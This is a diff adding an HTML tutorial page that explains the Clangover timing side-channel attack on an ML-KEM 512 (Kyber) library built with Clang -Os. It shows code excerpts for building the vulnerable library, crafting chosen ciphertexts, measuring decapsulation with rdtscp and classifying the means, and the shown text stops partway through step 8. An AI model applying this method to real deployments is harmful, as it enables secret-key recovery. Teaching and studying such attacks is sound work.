@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Clangover - Learn the Attack</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Courier New', monospace;
+    background: #0a0a1a;
+    color: #e0e0e0;
+  }
+
+  /* Header */
+  .header {
+    position: sticky; top: 0; z-index: 100;
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 12px 24px;
+    background: #0f0f2aee;
+    border-bottom: 1px solid #2a2a4e;
+    backdrop-filter: blur(8px);
+  }
+  .header h1 { font-size: 16px; color: #00ff41; letter-spacing: 2px; }
+  .header .sub { font-size: 11px; color: #666; margin-top: 2px; }
+  .header a {
+    font-size: 11px; color: #66aaff; text-decoration: none;
+    border: 1px solid #2a2a4e; padding: 5px 12px; border-radius: 4px;
+  }
+  .header a:hover { background: #1a1a3e; }
+
+  /* Legend */
+  .legend {
+    display: flex; gap: 16px; justify-content: center; flex-wrap: wrap;
+    padding: 12px 24px;
+    background: #0d0d22;
+    border-bottom: 1px solid #1a1a3e;
+    font-size: 11px; color: #666;
+  }
+  .legend-item { display: flex; align-items: center; gap: 5px; }
+
+  /* Tags */
+  .tag {
+    display: inline-block;
+    font-size: 9px; font-weight: bold;
+    padding: 1px 5px; border-radius: 3px;
+    vertical-align: middle;
+    letter-spacing: 0.5px;
+  }
+  .tag-s  { background: #1a2a4e; color: #66aaff; border: 1px solid #3366cc; }
+  .tag-ct { background: #2a1a3e; color: #aa66ff; border: 1px solid #8844cc; }
+  .tag-t  { background: #2a2a1a; color: #ffd700; border: 1px solid #aa8800; }
+  .tag-m  { background: #2a1a0a; color: #ff9944; border: 1px solid #cc6633; }
+  .tag-p  { background: #0a2a0a; color: #00ff41; border: 1px solid #00aa2a; }
+  .ref {
+    font-size: 10px; color: #555;
+    margin-left: 4px;
+  }
+
+  /* Three-column grid */
+  .learn-container {
+    max-width: 1300px;
+    margin: 0 auto;
+    padding: 0 16px;
+  }
+
+  /* Column headers (sticky) */
+  .col-headers {
+    display: grid;
+    grid-template-columns: 1fr 1.3fr 1.3fr;
+    gap: 0;
+    position: sticky; top: 52px; z-index: 90;
+    background: #0a0a1aee;
+    backdrop-filter: blur(8px);
+    border-bottom: 1px solid #1a1a3e;
+  }
+  .col-header {
+    padding: 8px 16px;
+    font-size: 11px; color: #555;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    border-right: 1px solid #1a1a3e;
+  }
+  .col-header:last-child { border-right: none; }
+
+  /* Step row */
+  .step-row {
+    display: grid;
+    grid-template-columns: 1fr 1.3fr 1.3fr;
+    gap: 0;
+    border-bottom: 1px solid #0f0f2a;
+    min-height: 80px;
+  }
+  .step-row:hover { background: #0d0d20; }
+
+  .col {
+    padding: 16px;
+    border-right: 1px solid #141430;
+    font-size: 12px;
+    line-height: 1.7;
+  }
+  .col:last-child { border-right: none; }
+
+  /* Step number badge */
+  .step-num {
+    display: inline-flex;
+    width: 24px; height: 24px;
+    align-items: center; justify-content: center;
+    border-radius: 50%;
+    font-size: 11px; font-weight: bold;
+    margin-right: 8px;
+    flex-shrink: 0;
+  }
+  .step-num.s-build  { background: #2a1a4e; color: #aa66ff; border: 1px solid #aa66ff; }
+  .step-num.s-keygen { background: #1a2a4e; color: #66aaff; border: 1px solid #66aaff; }
+  .step-num.s-craft  { background: #2a1a3e; color: #aa66ff; border: 1px solid #aa66ff; }
+  .step-num.s-time   { background: #2a2a1a; color: #ffd700; border: 1px solid #ffd700; }
+  .step-num.s-stat   { background: #2a1a0a; color: #ff9944; border: 1px solid #ff9944; }
+  .step-num.s-class  { background: #0a2a1a; color: #44cc88; border: 1px solid #44cc88; }
+  .step-num.s-match  { background: #0a2a0a; color: #00ff41; border: 1px solid #00ff41; }
+  .step-num.s-result { background: #0a3a0a; color: #00ff41; border: 1px solid #00ff41; }
+
+  .step-title { font-weight: bold; color: #e0e0e0; margin-bottom: 8px; display: flex; align-items: center; }
+  .step-desc { color: #999; }
+  .step-desc strong { color: #ccc; }
+
+  /* Code styling */
+  .code-block {
+    background: #0a0a18;
+    border: 1px solid #1a1a3e;
+    border-radius: 4px;
+    padding: 10px 12px;
+    font-size: 11px;
+    line-height: 1.65;
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .code-file { font-size: 10px; color: #444; margin-bottom: 4px; }
+  .kw { color: #cc99ff; }
+  .fn { color: #66ccff; }
+  .num { color: #ffcc66; }
+  .cmt { color: #445; }
+  .type { color: #66ffcc; }
+  .hl-line { background: #1a2a0a; display: inline-block; width: 100%; padding: 0 4px; margin: 0 -4px; }
+  .hl-warm { background: #1e1e0e; display: inline-block; width: 100%; padding: 0 4px; margin: 0 -4px; }
+
+  /* Calc styling */
+  .calc-box {
+    background: #0e0e24;
+    border: 1px solid #1e1e3e;
+    border-radius: 4px;
+    padding: 10px 12px;
+    font-size: 11px;
+    line-height: 1.7;
+    margin-bottom: 8px;
+  }
+  .calc-box .label { color: #555; font-size: 10px; margin-bottom: 4px; }
+  .calc-line { display: block; padding: 1px 0; }
+  .calc-group { display: block; margin-top: 10px; }
+  .val { color: #ffcc66; font-weight: bold; }
+  .val-g { color: #00ff41; font-weight: bold; }
+  .val-r { color: #ff0040; font-weight: bold; }
+  .val-b { color: #3366cc; }
+  .val-o { color: #cc6633; }
+  .val-y { color: #ffd700; font-weight: bold; }
+  .produces { color: #555; font-size: 10px; margin-top: 6px; border-top: 1px dashed #1a1a3e; padding-top: 4px; }
+
+  /* Connector between rows */
+  .connector-row {
+    display: grid;
+    grid-template-columns: 1fr 1.3fr 1.3fr;
+    gap: 0;
+    height: 28px;
+  }
+  .conn-col {
+    display: flex; justify-content: center; align-items: center;
+    border-right: 1px solid #141430;
+  }
+  .conn-col:last-child { border-right: none; }
+  .vline {
+    width: 2px; height: 100%;
+    background: linear-gradient(to bottom, #2a2a4e, #2a2a4e 60%, transparent 60%, transparent 70%, #2a2a4e 70%);
+    position: relative;
+  }
+  .vline::after {
+    content: ''; position: absolute; bottom: -3px; left: -3px;
+    width: 8px; height: 8px;
+    border-left: 2px solid #2a2a4e;
+    border-bottom: 2px solid #2a2a4e;
+    transform: rotate(-45deg);
+  }
+
+  /* Section divider */
+  .section-divider {
+    display: grid;
+    grid-template-columns: 1fr 1.3fr 1.3fr;
+    gap: 0;
+    background: #0f0f2a;
+    border-top: 1px solid #2a2a4e;
+    border-bottom: 1px solid #2a2a4e;
+  }
+  .section-label {
+    grid-column: 1 / -1;
+    padding: 8px 16px;
+    font-size: 11px; color: #ffd700;
+    letter-spacing: 1px;
+    text-align: center;
+  }
+
+  /* Means table */
+  .mtbl {
+    border-collapse: collapse;
+    font-size: 10px;
+    width: 100%;
+    margin: 4px 0;
+  }
+  .mtbl th {
+    background: #1a1a3e; color: #777;
+    padding: 3px 5px; border: 1px solid #2a2a4e;
+    text-align: center;
+  }
+  .mtbl td {
+    padding: 3px 5px; border: 1px solid #1e1e3e;
+    text-align: center; color: #bbb;
+  }
+
+  /* Pattern bits */
+  .bits { display: flex; gap: 3px; margin: 6px 0; align-items: center; }
+  .bit {
+    width: 22px; height: 22px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: bold; border-radius: 3px;
+    border: 1px solid #2a2a4e;
+  }
+  .bit.b0 { background: #1a2a4e; color: #3366cc; }
+  .bit.b1 { background: #4e2a1a; color: #cc6633; }
+  .arrow-right { color: #555; margin: 0 4px; }
+
+  /* Loop wrapper */
+  .loop-border {
+    border: 1px dashed #3a3a1a;
+    border-radius: 0;
+    position: relative;
+  }
+  .loop-badge {
+    position: sticky; top: 88px; z-index: 80;
+    background: #1a1a0a;
+    border: 1px dashed #ffd700;
+    padding: 4px 12px;
+    font-size: 10px; color: #ffd700;
+    text-align: center;
+    letter-spacing: 1px;
+  }
+
+  /* Result banner */
+  .result-banner {
+    text-align: center;
+    padding: 30px 20px;
+    background: #0a2a0a;
+    border: 1px solid #00ff41;
+    border-radius: 6px;
+  }
+  .result-banner .big { font-size: 20px; color: #00ff41; margin: 10px 0; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div>
+    <h1>LEARN THE ATTACK</h1>
+    <div class="sub">How Clangover recovers a single ML-KEM 512 secret coefficient step by step</div>
+  </div>
+  <a href="/">Live Visualizer</a>
+</div>
+
+<div class="legend">
+  <div class="legend-item"><span class="tag tag-s">S</span> Secret key value</div>
+  <div class="legend-item"><span class="tag tag-ct">CT</span> Ciphertext data</div>
+  <div class="legend-item"><span class="tag tag-t">T</span> Timing measurement</div>
+  <div class="legend-item"><span class="tag tag-m">M</span> Statistical mean</div>
+  <div class="legend-item"><span class="tag tag-p">P</span> Pattern / classification</div>
+  <div class="legend-item" style="color:#444">Tags trace values across steps</div>
+</div>
+
+<div class="learn-container">
+
+<!-- Column headers -->
+<div class="col-headers">
+  <div class="col-header">Description</div>
+  <div class="col-header">Code</div>
+  <div class="col-header">Computation</div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 1: Build Vulnerable Target -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-build">1</span> Build Vulnerable Target</div>
+    <div class="step-desc">
+      The Kyber library source code is <strong>constant-time</strong> &mdash; it shouldn't leak secrets via timing.
+      <br><br>
+      But when <strong>Clang 15-18</strong> compiles it with the <strong>-Os</strong> optimization flag,
+      it introduces a <strong>secret-dependent branch</strong> in <code>poly_frommsg()</code>.
+      <br><br>
+      The Makefile patches <code>-O3</code> to <code>-Os</code> and compiles with Clang to trigger this bug.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">Makefile</div>
+    <div class="code-block"><span class="hl-line"><span class="fn">sed</span> -i <span class="str">'s/-O3/-Os/g'</span> kyber/ref/Makefile</span>
+<span class="hl-line">CC=<span class="val">clang</span> make -C kyber/ref shared</span>
+
+<span class="cmt"># This produces:</span>
+<span class="cmt"># lib/libpqcrystals_kyber512_ref.so</span>
+<span class="cmt"># compiled with -Os (the vulnerable flag)</span></div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">What -Os changes</div>
+      <span class="calc-line">Source code (safe):</span>
+      <span class="calc-line"><code>r = ct &gt;&gt; 15; m = r - 1;</code></span>
+      <span class="calc-group">Clang -Os compiles this into:</span>
+      <span class="calc-line"><code><span class="val-r">branch</span> if bit == 0 goto L1</code></span>
+      <span class="calc-group">The branch takes <strong>different time</strong> depending on the secret bit &mdash; this is the side channel.</span>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 2: Generate Keypair -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-keygen">2</span> Generate Keypair</div>
+    <div class="step-desc">
+      Generate a random ML-KEM 512 keypair.
+      The secret key contains <strong>512 small coefficients</strong>, each in range [-3, +3].
+      <br><br>
+      We'll recover <strong>coefficient #42</strong> as our worked example.
+      <br><br>
+      The ground truth is extracted for validation only &mdash; the attacker never sees it.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">attack.c : 91-101</div>
+    <div class="code-block"><span class="cmt">// generate keypair</span>
+<span class="hl-line"><span class="fn">pqcrystals_kyber512_ref_keypair</span>(pk, sk);</span>
+
+<span class="cmt">// extract ground truth (validation only)</span>
+<span class="type">polyvec</span> skpv;
+<span class="fn">polyvec_frombytes</span>(&skpv, sk);
+<span class="fn">polyvec_invntt_tomont</span>(&skpv);
+<span class="kw">for</span> (i = <span class="num">0</span>; i &lt; <span class="num">512</span>; i++) {
+<span class="hl-warm">  s_truths[i] = <span class="fn">montgomery_reduce</span>(
+    skpv.vec[i/<span class="num">256</span>].coeffs[i%<span class="num">256</span>]);</span>
+}</div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">Keypair generation</div>
+      <span class="calc-line">Secret key = 2 polyvecs &times; 256 coefficients = <span class="val">512</span> values</span>
+      <div class="calc-group"><div class="label">Ground truth for coefficient #42</div></div>
+      <span class="calc-line">vec index = 42 / 256 = <span class="val">0</span></span>
+      <span class="calc-line">coeff index = 42 % 256 = <span class="val">42</span></span>
+      <span class="calc-group">s_truths[42] = montgomery_reduce(skpv.vec[<span class="val">0</span>].coeffs[<span class="val">42</span>])</span>
+      <span class="calc-line">s_truths[42] = <span class="val-g">-1</span> <span class="tag tag-s">S</span></span>
+      <div class="produces">Produces: <span class="tag tag-s">S</span> s[42] = -1 (unknown to attacker, used to verify at Step 11)</div>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 3: Craft Ciphertexts -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-craft">3</span> Craft 9 Chosen Ciphertexts</div>
+    <div class="step-desc">
+      Build <strong>sparse</strong> ciphertexts that isolate the influence of <strong>s[42]</strong> on the decryption result.
+      <br><br>
+      Only one entry in polynomial <strong>u</strong> and one in <strong>v</strong> are non-zero. Everything else is 0.
+      <br><br>
+      7 attack CTs probe different aspects of the coefficient. 2 reference CTs have <strong>known outcomes</strong> (m'=0 and m'=1) regardless of the secret.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">attack.c : 102-123</div>
+    <div class="code-block"><span class="kw">for</span> (ct_index = <span class="num">0</span>; ct_index &lt; <span class="num">9</span>; ct_index++) {
+
+  <span class="cmt">// zeroize all polynomials</span>
+  <span class="kw">for</span>(i...) u.vec[i].coeffs[j] = <span class="num">0</span>;
+  <span class="kw">for</span>(j...) v.coeffs[j] = <span class="num">0</span>;
+
+  <span class="cmt">// s_index=42, 42%256 != 0</span>
+  <span class="cmt">// position = 256 - 42 = 214</span>
+<span class="hl-line">  u.vec[<span class="num">0</span>].coeffs[<span class="num">214</span>] = ku[ct_index];</span>
+<span class="hl-line">  v.coeffs[<span class="num">0</span>] = kv[ct_index];</span>
+
+  <span class="fn">polyvec_compress</span>(cts[ct_index], &u);
+  <span class="fn">poly_compress</span>(..., &v);
+}</div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">Position calculation <span class="ref">&larr; targets <span class="tag tag-s">S</span> s[42]</span></div>
+      <span class="calc-line">s_index = 42</span>
+      <span class="calc-line">42 % 256 = 42 (non-zero)</span>
+      <span class="calc-line">u position = 256 - 42 = <span class="val">214</span></span>
+    </div>
+    <div class="calc-box">
+      <div class="label">9 ciphertext (ku, kv) pairs</div>
+      <table class="mtbl">
+        <tr><th>CT</th><th>ku &rarr; u[214]</th><th>kv &rarr; v[0]</th><th>Role</th></tr>
+        <tr><td>0</td><td><span class="val">140</span></td><td>2132</td><td>attack</td></tr>
+        <tr><td>1</td><td><span class="val">185</span></td><td>2923</td><td>attack</td></tr>
+        <tr><td>2</td><td><span class="val">106</span></td><td>521</td><td>attack</td></tr>
+        <tr><td>3</td><td><span class="val">277</span></td><td>3016</td><td>attack</td></tr>
+        <tr><td>4</td><td><span class="val">64</span></td><td>936</td><td>attack</td></tr>
+        <tr><td>5</td><td><span class="val">63</span></td><td>2548</td><td>attack</td></tr>
+        <tr><td>6</td><td><span class="val">267</span></td><td>1142</td><td>attack</td></tr>
+        <tr><td style="color:#3366cc">7</td><td>144</td><td>312</td><td><span class="val-b">known m'=0</span></td></tr>
+        <tr><td style="color:#cc6633">8</td><td>0</td><td>937</td><td><span class="val-o">known m'=1</span></td></tr>
+      </table>
+      <div class="produces">Produces: <span class="tag tag-ct">CT</span> 9 crafted ciphertexts targeting s[42]</div>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- LOOP START -->
+<div class="loop-badge">MEASUREMENT LOOP &mdash; repeats ~100,000 times per coefficient</div>
+<div class="loop-border">
+
+<!-- ============================================================ -->
+<!-- STEP 4: Reference Timing -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-time">4</span> Reference Timing</div>
+    <div class="step-desc">
+      Before each real measurement, time a <strong>reference decapsulation</strong> using an all-zero ciphertext.
+      <br><br>
+      This baseline cancels out CPU frequency variations (turbo boost, thermal throttling).
+      <br><br>
+      <code>rdtscp</code> reads the CPU cycle counter with nanosecond precision.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">attack.c : 145-148</div>
+    <div class="code-block"><span class="cmt">// reference measurement</span>
+<span class="hl-line">ref_before = <span class="fn">rdtscp64</span>();</span>
+<span class="hl-line"><span class="fn">kyber512_dec</span>(ss, ct_zero, sk);</span>
+<span class="hl-line">ref_after  = <span class="fn">rdtscp64</span>();</span></div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">CPU cycle counter (one iteration)</div>
+      <span class="calc-line">ref_before = <span class="val">8,420,173,856</span></span>
+      <span class="calc-group"><em style="color:#555">... decapsulate all-zero CT ...</em></span>
+      <span class="calc-group">ref_after = <span class="val">8,420,216,034</span></span>
+      <span class="calc-group">ref_duration = 8,420,216,034 - 8,420,173,856</span>
+      <span class="calc-line">ref_duration = <span class="val-y">42,178 cycles</span> <span class="tag tag-t">T</span></span>
+      <div class="produces">Produces: <span class="tag tag-t">T</span> ref_duration = 42,178 (baseline for this iteration)</div>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 5: Attack Timing -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-time">5</span> Attack Timing + Differential</div>
+    <div class="step-desc">
+      Randomly select one of the 9 crafted CTs and time its decapsulation.
+      <br><br>
+      Compute the <strong>differential</strong>: attack timing minus reference timing. This isolates the
+      secret-dependent timing from CPU noise.
+      <br><br>
+      Inside <code>kyber512_dec</code>, Clang's buggy branch executes &mdash; leaking whether m' = 0 or 1.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">attack.c : 140-157</div>
+    <div class="code-block"><span class="cmt">// pick random CT</span>
+<span class="fn">randombytes</span>(&ct_index, <span class="num">1</span>);
+ct_index = ct_index % <span class="num">9</span>; <span class="cmt">// = 3</span>
+
+<span class="cmt">// actual measurement</span>
+<span class="hl-line">before = <span class="fn">rdtscp64</span>();</span>
+<span class="hl-line"><span class="fn">kyber512_dec</span>(ss, cts[<span class="num">3</span>], sk);</span>
+<span class="hl-line">after  = <span class="fn">rdtscp64</span>();</span>
+
+<span class="cmt">// differential</span>
+<span class="hl-warm">att_measurement = after - before;</span>
+<span class="hl-warm">ref_measurement = ref_after - ref_before;</span>
+<span class="hl-warm">diff = att_measurement - ref_measurement;</span></div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">Attack CT[3] timing <span class="ref">&larr; <span class="tag tag-ct">CT</span> from Step 3</span></div>
+      <span class="calc-line">before = <span class="val">8,420,216,098</span></span>
+      <span class="calc-group"><em style="color:#555">... decapsulate CT[3] (the vulnerable poly_frommsg runs) ...</em></span>
+      <span class="calc-group">after = <span class="val">8,420,258,487</span></span>
+    </div>
+    <div class="calc-box">
+      <div class="label">Differential calculation <span class="ref">&larr; <span class="tag tag-t">T</span> ref from Step 4</span></div>
+      <span class="calc-line">att_measurement = 8,420,258,487 - 8,420,216,098 = <span class="val">42,389</span></span>
+      <span class="calc-line">ref_measurement = <span class="val-y">42,178</span> <span class="ref">&larr; Step 4</span></span>
+      <span class="calc-group">diff = 42,389 - 42,178 = <span class="val-y">+211 cycles</span> <span class="tag tag-t">T</span></span>
+      <div class="produces">Produces: <span class="tag tag-t">T</span> diff = +211 (raw timing signal for CT[3])</div>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 6: Outlier Filter + Welford -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-stat">6</span> Outlier Filter + Mean &amp; Variance Update</div>
+    <div class="step-desc">
+      If the differential is too large (context switch, interrupt), <strong>discard it</strong>.
+      <br><br>
+      Otherwise, update the <strong>running mean and variance</strong> for this CT using <strong>Welford's online algorithm</strong>.
+      No need to store all measurements &mdash; just the running mean, count, and M2 accumulator.
+      <br><br>
+      The variance is used later to assess <strong>per-bit confidence</strong> &mdash; if a CT's mean is ambiguously positioned between the two clusters, the guess is rejected and more iterations are collected.
+      <br><br>
+      Classification is gated: at least <strong>500 samples per CT</strong> must be collected before any guess is attempted, preventing premature decisions on noisy data.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">attack.c : 159-170</div>
+    <div class="code-block"><span class="cmt">// outlier filter</span>
+<span class="hl-line"><span class="kw">if</span> (<span class="fn">fabs</span>(diff) &lt; <span class="num">2000</span>) {</span>
+
+  <span class="cmt">// Welford's mean + variance</span>
+<span class="hl-line">  delta = diff - means[ct_index];</span>
+<span class="hl-line">  means[ct_index] += delta</span>
+<span class="hl-line">    / (<span class="type">double</span>)(++nbs[ct_index]);</span>
+<span class="hl-warm">  delta2 = diff - means[ct_index];</span>
+<span class="hl-warm">  m2s[ct_index] += delta * delta2;</span>
+
+} <span class="kw">else</span> {
+  discarded++;
+}
+
+<span class="cmt">// gate: need &ge;500 samples per CT</span>
+<span class="hl-line">min_nbs = <span class="fn">min_of</span>(nbs[0..8]);</span>
+<span class="hl-line"><span class="kw">if</span> (min_nbs &ge; <span class="num">500</span>) evaluate();</span></div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">Outlier check <span class="ref">&larr; <span class="tag tag-t">T</span> diff from Step 5</span></div>
+      <span class="calc-line">|diff| = |<span class="val-y">+211</span>| = 211</span>
+      <span class="calc-line">OUTLIER_THRESHOLD = 2000</span>
+      <span class="calc-line">211 &lt; 2000 &rarr; <span class="val-g">KEEP</span></span>
+    </div>
+    <div class="calc-box">
+      <div class="label">Welford update for means[3] <span class="ref">&larr; <span class="tag tag-t">T</span> diff from Step 5</span></div>
+      <span class="calc-line"><em style="color:#555">Before: means[3] = 194.200, nbs[3] = 8,431</em></span>
+      <span class="calc-group">delta = diff - means[3]</span>
+      <span class="calc-line">delta = 211 - 194.200 = <span class="val">16.8</span></span>
+      <span class="calc-group">nbs[3]++ &rarr; nbs[3] = <span class="val">8,432</span></span>
+      <span class="calc-group">means[3] += delta / nbs[3]</span>
+      <span class="calc-line">means[3] += 16.8 / 8,432</span>
+      <span class="calc-line">means[3] += 0.00199</span>
+      <span class="calc-line">means[3] = <span class="val-y">194.202</span></span>
+      <span class="calc-group"><em style="color:#888">Variance tracking (Welford M2):</em></span>
+      <span class="calc-line">delta2 = diff - means[3] = 211 - 194.202 = <span class="val">16.798</span></span>
+      <span class="calc-line">m2s[3] += delta &times; delta2</span>
+      <span class="calc-line">m2s[3] += 16.8 &times; 16.798 = <span class="val">+282.2</span></span>
+      <span class="calc-line">variance = m2s[3] / nbs[3] &asymp; <span class="val-y">48,200</span></span>
+      <div class="produces">After 8,432 samples, each new measurement shifts the mean by ~0.002 cycles. Variance tracks measurement stability. The signal emerges from noise through sheer repetition.</div>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+</div><!-- end loop-border -->
+
+<div class="section-divider">
+  <div class="section-label">AFTER ~50,000 ITERATIONS &mdash; means have converged</div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 7: Converged Means -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-stat">7</span> Stable Means &mdash; Two Clusters</div>
+    <div class="step-desc">
+      After enough iterations, the 9 timing means settle into <strong>two distinct clusters</strong>:
+      <br><br>
+      &bull; <strong style="color:#3366cc">~190 cycles</strong> &mdash; matches CT[7] (known m'=0)
+      <br>
+      &bull; <strong style="color:#cc6633">~50 cycles</strong> &mdash; matches CT[8] (known m'=1)
+      <br><br>
+      The <strong>~137-cycle gap</strong> between clusters is the timing side channel created by Clang's bug.
+      <br><br>
+      CT[7] and CT[8] serve as <strong>anchors</strong> &mdash; we know their m' values, so we can classify the 7 attack CTs by proximity.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">attack.c : 133-138</div>
+    <div class="code-block"><span class="cmt">// loop ran ~50,000 iterations</span>
+<span class="kw">while</span> (
+  ((itx &lt; <span class="num">100000</span>) ||
+   (confidence &lt; <span class="num">5</span>)) &&
+  (confidence &lt; <span class="num">20</span>)
+) {
+  <span class="cmt">// ... measurement loop ...</span>
+}
+<span class="cmt">// means[] now stable</span></div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">Converged means (differential cycles) <span class="ref">&larr; accumulated from <span class="tag tag-t">T</span> Steps 4-6</span></div>
+      <table class="mtbl">
+        <tr><th>CT</th><th>Mean</th><th>Samples</th><th>Cluster</th></tr>
+        <tr><td>0</td><td><span class="val-o">55.3</span></td><td>5,612</td><td style="color:#cc6633">LOW (~50)</td></tr>
+        <tr><td>1</td><td><span class="val-b">192.7</span></td><td>5,548</td><td style="color:#3366cc">HIGH (~190)</td></tr>
+        <tr><td>2</td><td><span class="val-b">186.1</span></td><td>5,580</td><td style="color:#3366cc">HIGH</td></tr>
+        <tr><td>3</td><td><span class="val-b">191.4</span></td><td>5,503</td><td style="color:#3366cc">HIGH</td></tr>
+        <tr><td>4</td><td><span class="val-b">188.9</span></td><td>5,541</td><td style="color:#3366cc">HIGH</td></tr>
+        <tr><td>5</td><td><span class="val-o">48.7</span></td><td>5,625</td><td style="color:#cc6633">LOW</td></tr>
+        <tr><td>6</td><td><span class="val-b">185.2</span></td><td>5,492</td><td style="color:#3366cc">HIGH</td></tr>
+        <tr style="background:#0a0f1a"><td style="color:#3366cc"><strong>7</strong></td><td><span class="val-b"><strong>189.4</strong></span></td><td>5,567</td><td style="color:#3366cc"><strong>ANCHOR m'=0</strong></td></tr>
+        <tr style="background:#1a0f0a"><td style="color:#cc6633"><strong>8</strong></td><td><span class="val-o"><strong>52.1</strong></span></td><td>5,589</td><td style="color:#cc6633"><strong>ANCHOR m'=1</strong></td></tr>
+      </table>
+      <div class="produces">Produces: <span class="tag tag-m">M</span> 9 stable means + 2 anchor values for classification</div>
+    </div>
+  </div>
+</div>
+
+<div class="connector-row">
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+  <div class="conn-col"><div class="vline"></div></div>
+</div>
+
+<!-- ============================================================ -->
+<!-- STEP 8: Classification -->
+<!-- ============================================================ -->
+<div class="step-row">
+  <div class="col">
+    <div class="step-title"><span class="step-num s-class">8</span> Per-bit Confidence + Classification</div>
+    <div class="step-desc">
+      First, compute the <strong>anchor gap</strong>: the distance between the two known anchors (CT[7] and CT[8]).
+      <br><br>
+      For each of the 7 attack CTs, measure <strong>distance</strong> to both anchor means. Before classifying, apply a <strong>per-bit confidence check</strong>:
+      <br><br>
+      If the nearer distance exceeds <strong>30% of the anchor gap</strong>, the bit is <strong>ambiguous</strong> &mdash; reject the entire guess and collect more iterations.
+      <br><br>
+      Only if all 7 bits pass the confidence check does classification proceed: the closer anchor wins.
+    </div>
+  </div>
+  <div class="col">
+    <div class="code-file">guess.h : 74-93</div>
+    <div class="code-block"><span class="cmt">// anchor gap for confidence</span>
+<span class="hl-warm">anchor_gap = <span class="fn">fabs</span>(means[<span class="num">7</span>] - means[<span class="num">8</span>]);</span>
+
+<span class="kw">for</span> (ct_index=<span class="num">0</span>; ct_index &lt; <span class="num">7</span>; ct_index++) {
+
+  <span class="cmt">// distance to each anchor</span>
+<span class="hl-line">  dist_zero = <span class="fn">fabs</span>(means[<span class="num">7</span>] - means[ct_index]);</span>
+<span class="hl-line">  dist_one  = <span class="fn">fabs</span>(means[<span class="num">8</span>] - means[ct_index]);</span>
+
+  <span class="cmt">// per-bit confidence check</span>
+<span class="hl-warm">  near_dist = <span class="fn">min</span>(dist_zero, dist_one);</span>
+<span class="hl-warm">  <span class="kw">if</span> (near_dist &gt; <span class="num">0.3</span> * anchor_gap)</span>
+<span class="hl-warm">    <span class="kw">return</span> DONT_KNOW; <span class="cmt">// ambiguous!</span></span>
+
+  <span class="cmt">// classify: closer anchor wins</span>
+<span class="hl-line">  m_guesses[ct_index] =</span>
+<span class="hl-line">    (dist_zero &gt; dist_one) ? <span class="num">1</span> : <span class="num">0</span>;</span>
+}</div>
+  </div>
+  <div class="col">
+    <div class="calc-box">
+      <div class="label">Anchor gap &amp; per-bit confidence <span class="ref">&larr; <span class="tag tag-m">M</span> means from Step 7</span></div>
+      <span class="calc-line">anchor_gap = |189.4 - 52.1| = <span class="val-y">137.3</span></span>
+      <span class="calc-line">threshold = 0.3 &times; 137.3 = <span class="val-y">41.2</span></span>
+      <span class="calc-group"><em style="color:#888">Each bit must have near_dist &le; 41.2 to pass</em></span>
+    </div>
+    <div class="calc-box">
